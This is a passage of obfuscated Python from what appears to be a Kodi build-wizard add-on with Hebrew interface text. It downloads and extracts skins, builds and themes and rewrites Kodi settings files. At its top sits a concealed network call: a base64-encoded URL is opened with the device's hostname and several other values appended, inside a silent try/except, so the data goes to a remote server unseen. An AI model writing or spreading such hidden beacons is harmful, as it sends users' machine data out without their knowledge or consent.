          OOO00O00O0O0O0000 =OOOO0O0OOOO0000OO #line:4124
          import socket #line:4126
          O0O0O0OOOO000O00O =urllib2 .urlopen (O000OOO0O0O00OO00 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOOO000O0OOOOOO0 +' - '+OOO00O00O0O0O0000 +' - '+OOOO00OO00O000OO0 +' - '+OO00O00O0OOO0O00O ).readlines ()#line:4127
       except :pass #line:4129
def skinfix18 ():#line:4131
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:4132
		O00O00O00OOOOOOOO =wiz .workingURL (SKINID18DDONXML )#line:4133
		if O00O00O00OOOOOOOO ==True :#line:4134
			O0O000OO0OO0O00OO =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:4135
			if len (O0O000OO0OO0O00OO )>0 :#line:4136
				O000O0OO00OOOO0OO ='%s-%s.zip'%(SKINID18 ,O0O000OO0OO0O00OO [0 ])#line:4137
				O0OO0000OOO00O00O =wiz .workingURL (SKIN18ZIPURL +O000O0OO00OOOO0OO )#line:4138
				if O0OO0000OOO00O00O ==True :#line:4139
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4140
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4141
					O000000O0O0OO0OOO =os .path .join (PACKAGES ,O000O0OO00OOOO0OO )#line:4142
					try :os .remove (O000000O0O0OO0OOO )#line:4143
					except :pass #line:4144
					downloader .download (SKIN18ZIPURL +O000O0OO00OOOO0OO ,O000000O0O0OO0OOO ,DP )#line:4145
					extract .all (O000000O0O0OO0OOO ,HOME ,DP )#line:4146
					try :#line:4147
						O00O00OOOOOO0000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4148
						OOOO000000OOO00O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4149
						os .rename (O00O00OOOOOO0000O ,OOOO000000OOO00O0 )#line:4150
					except :#line:4151
						pass #line:4152
					try :#line:4153
						OO00OOO0O0OOO00O0 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O0OOO0OO00O0O000O =OO00OOO0O0OOO00O0 .read ();OO00OOO0O0OOO00O0 .close ()#line:4154
						O0OO0OO0O0OO0OO0O =wiz .parseDOM (O0OOO0OO00O0O000O ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:4155
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0OO0O0OO0OO0O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:4156
					except :#line:4157
						pass #line:4158
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:4159
					DP .close ()#line:4160
					xbmc .sleep (500 )#line:4161
					wiz .forceUpdate (True )#line:4162
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4163
				else :#line:4164
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4165
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0OO0000OOO00O00O ,xbmc .LOGERROR )#line:4166
			else :#line:4167
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4168
		else :#line:4169
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4170
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4171
def skinfix17 ():#line:4172
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:4173
		OO00OO00O0O00OO00 =wiz .workingURL (SKINID17DDONXML )#line:4174
		if OO00OO00O0O00OO00 ==True :#line:4175
			OO0O0OO0OOO0O0O00 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:4176
			if len (OO0O0OO0OOO0O0O00 )>0 :#line:4177
				O00O000O00O00000O ='%s-%s.zip'%(SKINID17 ,OO0O0OO0OOO0O0O00 [0 ])#line:4178
				O0OO0O0OOOOO0OO00 =wiz .workingURL (SKIN17ZIPURL +O00O000O00O00000O )#line:4179
				if O0OO0O0OOOOO0OO00 ==True :#line:4180
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4181
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4182
					OOO0OO00O0O0O000O =os .path .join (PACKAGES ,O00O000O00O00000O )#line:4183
					try :os .remove (OOO0OO00O0O0O000O )#line:4184
					except :pass #line:4185
					downloader .download (SKIN17ZIPURL +O00O000O00O00000O ,OOO0OO00O0O0O000O ,DP )#line:4186
					extract .all (OOO0OO00O0O0O000O ,HOME ,DP )#line:4187
					try :#line:4188
						O00O0O0O00OOO0O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4189
						OOO0OOO0OO0OO00O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4190
						os .rename (O00O0O0O00OOO0O00 ,OOO0OOO0OO0OO00O0 )#line:4191
					except :#line:4192
						pass #line:4193
					try :#line:4194
						OOOOOO0000OO00000 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O0000000O0O0O0OOO =OOOOOO0000OO00000 .read ();OOOOOO0000OO00000 .close ()#line:4195
						OOO0O00OO00OO000O =wiz .parseDOM (O0000000O0O0O0OOO ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:4196
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0O00OO00OO000O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:4197
					except :#line:4198
						pass #line:4199
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:4200
					DP .close ()#line:4201
					xbmc .sleep (500 )#line:4202
					wiz .forceUpdate (True )#line:4203
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4204
				else :#line:4205
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4206
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0OO0O0OOOOO0OO00 ,xbmc .LOGERROR )#line:4207
			else :#line:4208
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4209
		else :#line:4210
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4211
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4212
def fix17update ():#line:4213
	if KODIV >=17 and KODIV <18 :#line:4214
		wiz .kodi17Fix ()#line:4215
		xbmc .sleep (4000 )#line:4216
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4217
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4218
		fixfont ()#line:4219
		O00000O00OO00OO0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4220
		try :#line:4222
			OOOOOO00O0000OO0O =open (O00000O00OO00OO0O ,'r')#line:4223
			O0OO00O00O0OOOO00 =OOOOOO00O0000OO0O .read ()#line:4224
			OOOOOO00O0000OO0O .close ()#line:4225
			O0O000OO0OOOO0O00 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:4226
			OOO000O00OOOO000O =re .compile (O0O000OO0OOOO0O00 ).findall (O0OO00O00O0OOOO00 )[0 ]#line:4227
			OOOOOO00O0000OO0O =open (O00000O00OO00OO0O ,'w')#line:4228
			OOOOOO00O0000OO0O .write (O0OO00O00O0OOOO00 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOO000O00OOOO000O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:4229
			OOOOOO00O0000OO0O .close ()#line:4230
		except :#line:4231
				pass #line:4232
		wiz .kodi17Fix ()#line:4233
		O00000O00OO00OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4234
		try :#line:4235
			OOOOOO00O0000OO0O =open (O00000O00OO00OO0O ,'r')#line:4236
			O0OO00O00O0OOOO00 =OOOOOO00O0000OO0O .read ()#line:4237
			OOOOOO00O0000OO0O .close ()#line:4238
			O0O000OO0OOOO0O00 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:4239
			OOO000O00OOOO000O =re .compile (O0O000OO0OOOO0O00 ).findall (O0OO00O00O0OOOO00 )[0 ]#line:4240
			OOOOOO00O0000OO0O =open (O00000O00OO00OO0O ,'w')#line:4241
			OOOOOO00O0000OO0O .write (O0OO00O00O0OOOO00 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOO000O00OOOO000O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:4242
			OOOOOO00O0000OO0O .close ()#line:4243
		except :#line:4244
				pass #line:4245
		swapSkins ('skin.Premium.mod')#line:4246
def fix18update ():#line:4248
	if KODIV >=18 :#line:4249
		xbmc .sleep (4000 )#line:4250
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4251
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4252
		fixfont ()#line:4253
		OOOOOO00O0O00O000 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4254
		try :#line:4255
			O0OO0O0OO0O00O0OO =open (OOOOOO00O0O00O000 ,'r')#line:4256
			OOOO0OO0OO00O0OOO =O0OO0O0OO0O00O0OO .read ()#line:4257
			O0OO0O0OO0O00O0OO .close ()#line:4258
			O0O0000000O0OO000 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:4259
			OOOOO0O0O00O00000 =re .compile (O0O0000000O0OO000 ).findall (OOOO0OO0OO00O0OOO )[0 ]#line:4260
			O0OO0O0OO0O00O0OO =open (OOOOOO00O0O00O000 ,'w')#line:4261
			O0OO0O0OO0O00O0OO .write (OOOO0OO0OO00O0OOO .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OOOOO0O0O00O00000 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:4262
			O0OO0O0OO0O00O0OO .close ()#line:4263
		except :#line:4264
				pass #line:4265
		wiz .kodi17Fix ()#line:4266
		OOOOOO00O0O00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4267
		try :#line:4268
			O0OO0O0OO0O00O0OO =open (OOOOOO00O0O00O000 ,'r')#line:4269
			OOOO0OO0OO00O0OOO =O0OO0O0OO0O00O0OO .read ()#line:4270
			O0OO0O0OO0O00O0OO .close ()#line:4271
			O0O0000000O0OO000 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:4272
			OOOOO0O0O00O00000 =re .compile (O0O0000000O0OO000 ).findall (OOOO0OO0OO00O0OOO )[0 ]#line:4273
			O0OO0O0OO0O00O0OO =open (OOOOOO00O0O00O000 ,'w')#line:4274
			O0OO0O0OO0O00O0OO .write (OOOO0OO0OO00O0OOO .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OOOOO0O0O00O00000 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:4275
			O0OO0O0OO0O00O0OO .close ()#line:4276
		except :#line:4277
				pass #line:4278
		swapSkins ('skin.Premium.mod')#line:4279
def buildWizard (OO0O0OO0000OOOO00 ,O000O0O000OO0O000 ,theme =None ,over =False ):#line:4282
	O0000O0OO0OO00O0O =xbmcgui .DialogBusy ()#line:4283
	O0000O0OO0OO00O0O .create ()#line:4284
	if over ==False :#line:4285
		O0O00O0O0O0OO0O00 =wiz .checkBuild (OO0O0OO0000OOOO00 ,'url')#line:4286
		if USERNAME =='':#line:4287
			ADDON .openSettings ()#line:4288
			sys .exit ()#line:4289
		if PASSWORD =='':#line:4290
			ADDON .openSettings ()#line:4291
			sys .exit ()#line:4292
		if BUILDNAME =='':#line:4294
			O0000000OO0OOOOOO =u_list (SPEEDFILE )#line:4295
			(O0000000OO0OOOOOO )#line:4296
		if O0O00O0O0O0OO0O00 ==False :#line:4297
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:4302
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:4303
			return #line:4304
		O00OOOOOOO0OO0OOO =wiz .workingURL (O0O00O0O0O0OO0O00 )#line:4305
		if O00OOOOOOO0OO0OOO ==False :#line:4306
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O00OOOOOOO0OO0OOO ))#line:4307
			return #line:4308
	if O000O0O000OO0O000 =='gui':#line:4309
		if OO0O0OO0000OOOO00 ==BUILDNAME :#line:4310
			if over ==True :O0OOOO0OO000OOO00 =1 #line:4311
			else :O0OOOO0OO000OOO00 =1 #line:4312
		else :#line:4313
			O0OOOO0OO000OOO00 =1 #line:4314
		if O0OOOO0OO000OOO00 :#line:4315
			remove_addons ()#line:4316
			remove_addons2 ()#line:4317
			debridit .debridIt ('update','all')#line:4318
			traktit .traktIt ('update','all')#line:4319
			OO0000000O0OOO00O =wiz .checkBuild (OO0O0OO0000OOOO00 ,'gui')#line:4320
			OOOOOO0O0O0000O00 =OO0O0OO0000OOOO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4321
			if not wiz .workingURL (OO0000000O0OOO00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4322
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4323
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0OO0000OOOO00 ),'','אנא המתן')#line:4324
			OOOOOOO00O0O0O0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOO0O0O0000O00 )#line:4325
			try :os .remove (OOOOOOO00O0O0O0O0 )#line:4326
			except :pass #line:4327
			logging .warning (OO0000000O0OOO00O )#line:4328
			if 'google'in OO0000000O0OOO00O :#line:4329
			   OOOOOO000O0OO0OO0 =googledrive_download (OO0000000O0OOO00O ,OOOOOOO00O0O0O0O0 ,DP ,wiz .checkBuild (OO0O0OO0000OOOO00 ,'filesize'))#line:4330
			else :#line:4333
			  downloader .download (OO0000000O0OOO00O ,OOOOOOO00O0O0O0O0 ,DP )#line:4334
			xbmc .sleep (100 )#line:4335
			O00OOOO00OOOOO0O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0OO0000OOOO00 )#line:4336
			DP .update (0 ,O00OOOO00OOOOO0O0 ,'','אנא המתן')#line:4337
			extract .all (OOOOOOO00O0O0O0O0 ,HOME ,DP ,title =O00OOOO00OOOOO0O0 )#line:4338
			DP .close ()#line:4339
			wiz .defaultSkin ()#line:4340
			wiz .lookandFeelData ('save')#line:4341
			try :#line:4342
				telemedia_android5fix ()#line:4343
			except :pass #line:4344
			wiz .kodi17Fix ()#line:4345
			if KODIV >=18 :#line:4346
				skindialogsettind18 ()#line:4347
			debridit .debridIt ('restore','all')#line:4348
			traktit .traktIt ('restore','all')#line:4349
			if INSTALLMETHOD ==1 :OOO0O00000O00OOO0 =1 #line:4351
			elif INSTALLMETHOD ==2 :OOO0O00000O00OOO0 =0 #line:4352
			else :DP .close ()#line:4353
			OO0OO00O00000OOOO =(NOTIFICATION2 )#line:4354
			O000OOOO0O000000O =urllib2 .urlopen (OO0OO00O00000OOOO )#line:4355
			O000O0OO0000OO0O0 =O000OOOO0O000000O .readlines ()#line:4356
			O0OOOO0O00O0OOOOO =0 #line:4357
			for O0O0000OO0OOO00OO in O000O0OO0000OO0O0 :#line:4360
				if O0O0000OO0OOO00OO .split (' ==')[0 ]=="noreset"or O0O0000OO0OOO00OO .split ()[0 ]=="noreset":#line:4361
					xbmc .executebuiltin ("ReloadSkin()")#line:4363
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:4364
					update_Votes ()#line:4365
					indicatorfastupdate ()#line:4366
				if O0O0000OO0OOO00OO .split (' ==')[0 ]=="reset"or O0O0000OO0OOO00OO .split ()[0 ]=="reset":#line:4367
					update_Votes ()#line:4369
					indicatorfastupdate ()#line:4370
					resetkodi ()#line:4371
		else :#line:4380
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4381
	if O000O0O000OO0O000 =='gui2':#line:4382
		if OO0O0OO0000OOOO00 ==BUILDNAME :#line:4383
			if over ==True :O0OOOO0OO000OOO00 =1 #line:4384
			else :O0OOOO0OO000OOO00 =1 #line:4385
		else :#line:4386
			O0OOOO0OO000OOO00 =1 #line:4387
		if O0OOOO0OO000OOO00 :#line:4388
			remove_addons ()#line:4389
			remove_addons2 ()#line:4390
			OO0000000O0OOO00O =wiz .checkBuild (OO0O0OO0000OOOO00 ,'gui')#line:4391
			OOOOOO0O0O0000O00 =OO0O0OO0000OOOO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4392
			if not wiz .workingURL (OO0000000O0OOO00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4393
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4394
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0OO0000OOOO00 ),'','אנא המתן')#line:4395
			OOOOOOO00O0O0O0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOO0O0O0000O00 )#line:4396
			try :os .remove (OOOOOOO00O0O0O0O0 )#line:4397
			except :pass #line:4398
			logging .warning (OO0000000O0OOO00O )#line:4399
			if 'google'in OO0000000O0OOO00O :#line:4400
			   OOOOOO000O0OO0OO0 =googledrive_download (OO0000000O0OOO00O ,OOOOOOO00O0O0O0O0 ,DP ,wiz .checkBuild (OO0O0OO0000OOOO00 ,'filesize'))#line:4401
			else :#line:4404
			  downloader .download (OO0000000O0OOO00O ,OOOOOOO00O0O0O0O0 ,DP )#line:4405
			xbmc .sleep (100 )#line:4406
			O00OOOO00OOOOO0O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0OO0000OOOO00 )#line:4407
			DP .update (0 ,O00OOOO00OOOOO0O0 ,'','אנא המתן')#line:4408
			extract .all (OOOOOOO00O0O0O0O0 ,HOME ,DP ,title =O00OOOO00OOOOO0O0 )#line:4409
			DP .close ()#line:4410
			wiz .defaultSkin ()#line:4411
			wiz .lookandFeelData ('save')#line:4412
			if INSTALLMETHOD ==1 :OOO0O00000O00OOO0 =1 #line:4415
			elif INSTALLMETHOD ==2 :OOO0O00000O00OOO0 =0 #line:4416
			else :DP .close ()#line:4417
		else :#line:4419
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4420
	elif O000O0O000OO0O000 =='fresh':#line:4421
		freshStart (OO0O0OO0000OOOO00 )#line:4422
	elif O000O0O000OO0O000 =='normal':#line:4423
		if url =='normal':#line:4424
			if KEEPTRAKT =='true':#line:4425
				traktit .autoUpdate ('all')#line:4426
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4427
			if KEEPREAL =='true':#line:4428
				debridit .autoUpdate ('all')#line:4429
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4430
			if KEEPLOGIN =='true':#line:4431
				loginit .autoUpdate ('all')#line:4432
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4433
		O00OOOOO0O0OOOO00 =int (KODIV );OO000OO0OOO00O00O =int (float (wiz .checkBuild (OO0O0OO0000OOOO00 ,'kodi')))#line:4434
		if not O00OOOOO0O0OOOO00 ==OO000OO0OOO00O00O :#line:4435
			if O00OOOOO0O0OOOO00 ==16 and OO000OO0OOO00O00O <=15 :O000OO00OO000O00O =False #line:4436
			else :O000OO00OO000O00O =True #line:4437
		else :O000OO00OO000O00O =False #line:4438
		if O000OO00OO000O00O ==True :#line:4439
			O0OOO0OO0OOOOO0O0 =1 #line:4440
		else :#line:4441
			if not over ==False :O0OOO0OO0OOOOO0O0 =1 #line:4442
			else :O0OOO0OO0OOOOO0O0 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4443
		if O0OOO0OO0OOOOO0O0 :#line:4444
			wiz .clearS ('build')#line:4445
			OO0000000O0OOO00O =wiz .checkBuild (OO0O0OO0000OOOO00 ,'url')#line:4446
			OOOOOO0O0O0000O00 =OO0O0OO0000OOOO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4447
			if not wiz .workingURL (OO0000000O0OOO00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4448
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4449
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,OO0O0OO0000OOOO00 ,wiz .checkBuild (OO0O0OO0000OOOO00 ,'version')),'','אנא המתן')#line:4450
			OOOOOOO00O0O0O0O0 =os .path .join (PACKAGES ,'%s.zip'%OOOOOO0O0O0000O00 )#line:4451
			try :os .remove (OOOOOOO00O0O0O0O0 )#line:4452
			except :pass #line:4453
			logging .warning (OO0000000O0OOO00O )#line:4454
			if 'google'in OO0000000O0OOO00O :#line:4455
			   OOOOOO000O0OO0OO0 =googledrive_download (OO0000000O0OOO00O ,OOOOOOO00O0O0O0O0 ,DP ,wiz .checkBuild (OO0O0OO0000OOOO00 ,'filesize'))#line:4456
			else :#line:4459
			  downloader .download (OO0000000O0OOO00O ,OOOOOOO00O0O0O0O0 ,DP )#line:4460
			xbmc .sleep (1000 )#line:4461
			O00OOOO00OOOOO0O0 ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0OO0000OOOO00 ,wiz .checkBuild (OO0O0OO0000OOOO00 ,'version'))#line:4462
			DP .update (0 ,O00OOOO00OOOOO0O0 ,'','אנא המתן...')#line:4463
			O0OOO000OOO0OOOOO ,O00O00OOOOOOOO0O0 ,O000O0OO0OO0OOO0O =extract .all (OOOOOOO00O0O0O0O0 ,HOME ,DP ,title =O00OOOO00OOOOO0O0 )#line:4464
			if int (float (O0OOO000OOO0OOOOO ))>0 :#line:4465
				try :#line:4466
					wiz .fixmetas ()#line:4467
				except :pass #line:4468
				wiz .lookandFeelData ('save')#line:4469
				wiz .defaultSkin ()#line:4470
				wiz .setS ('buildname',OO0O0OO0000OOOO00 )#line:4472
				wiz .setS ('buildversion',wiz .checkBuild (OO0O0OO0000OOOO00 ,'version'))#line:4473
				wiz .setS ('buildtheme','')#line:4474
				wiz .setS ('latestversion',wiz .checkBuild (OO0O0OO0000OOOO00 ,'version'))#line:4475
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4476
				wiz .setS ('installed','true')#line:4477
				wiz .setS ('extract',str (O0OOO000OOO0OOOOO ))#line:4478
				wiz .setS ('errors',str (O00O00OOOOOOOO0O0 ))#line:4479
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OOO000OOO0OOOOO ,O00O00OOOOOOOO0O0 ))#line:4480
				fastupdatefirstbuild (NOTEID )#line:4481
				try :#line:4482
					telemedia_android5fix ()#line:4483
				except :pass #line:4484
				wiz .kodi17Fix ()#line:4485
				skin_homeselect ()#line:4486
				skin_lower ()#line:4487
				kodi17to18 ()#line:4492
				try :os .remove (OOOOOOO00O0O0O0O0 )#line:4494
				except :pass #line:4495
				DP .close ()#line:4515
				O0O0O0OO0O000O0OO =wiz .themeCount (OO0O0OO0000OOOO00 )#line:4516
				builde_Votes ()#line:4517
				indicator ()#line:4518
				if not O0O0O0OO0O000O0OO ==False :#line:4519
					buildWizard (OO0O0OO0000OOOO00 ,'theme')#line:4520
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4521
				if INSTALLMETHOD ==1 :OOO0O00000O00OOO0 =1 #line:4522
				elif INSTALLMETHOD ==2 :OOO0O00000O00OOO0 =0 #line:4523
				else :resetkodi ()#line:4524
				if OOO0O00000O00OOO0 ==1 :wiz .reloadFix ()#line:4526
				else :wiz .killxbmc (True )#line:4527
			else :#line:4528
				if isinstance (O00O00OOOOOOOO0O0 ,unicode ):#line:4529
					O000O0OO0OO0OOO0O =O000O0OO0OO0OOO0O .encode ('utf-8')#line:4530
				OO0O0OOO0O000000O =open (OOOOOOO00O0O0O0O0 ,'r')#line:4531
				OO0O0O0OO000O00O0 =OO0O0OOO0O000000O .read ()#line:4532
				OO0O0O0OOOOO0O0OO =''#line:4533
				for O00OO0O0OOOOOO0OO in OOOOOO000O0OO0OO0 :#line:4534
				  OO0O0O0OOOOO0O0OO ='key: '+OO0O0O0OOOOO0O0OO +'\n'+O00OO0O0OOOOOO0OO #line:4535
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O000O0OO0OO0OOO0O +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO0O0O0OOOOO0O0OO )#line:4536
		else :#line:4537
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4538
	elif O000O0O000OO0O000 =='theme':#line:4539
		if theme ==None :#line:4540
			O0O0O0OO0O000O0OO =wiz .checkBuild (OO0O0OO0000OOOO00 ,'theme')#line:4541
			O00OOO0OOOO0O0OOO =[]#line:4542
			if not O0O0O0OO0O000O0OO =='http://'and wiz .workingURL (O0O0O0OO0O000O0OO )==True :#line:4543
				O00OOO0OOOO0O0OOO =wiz .themeCount (OO0O0OO0000OOOO00 ,False )#line:4544
				if len (O00OOO0OOOO0O0OOO )>0 :#line:4545
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OO0O0OO0000OOOO00 ,COLOR1 ,len (O00OOO0OOOO0O0OOO )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4546
						wiz .log ("Theme List: %s "%str (O00OOO0OOOO0O0OOO ))#line:4547
						O0O0000OOOOO0OO00 =DIALOG .select (ADDONTITLE ,O00OOO0OOOO0O0OOO )#line:4548
						wiz .log ("Theme install selected: %s"%O0O0000OOOOO0OO00 )#line:4549
						if not O0O0000OOOOO0OO00 ==-1 :theme =O00OOO0OOOO0O0OOO [O0O0000OOOOO0OO00 ];OOO0O00O0OO0O0OO0 =True #line:4550
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4551
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4552
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4553
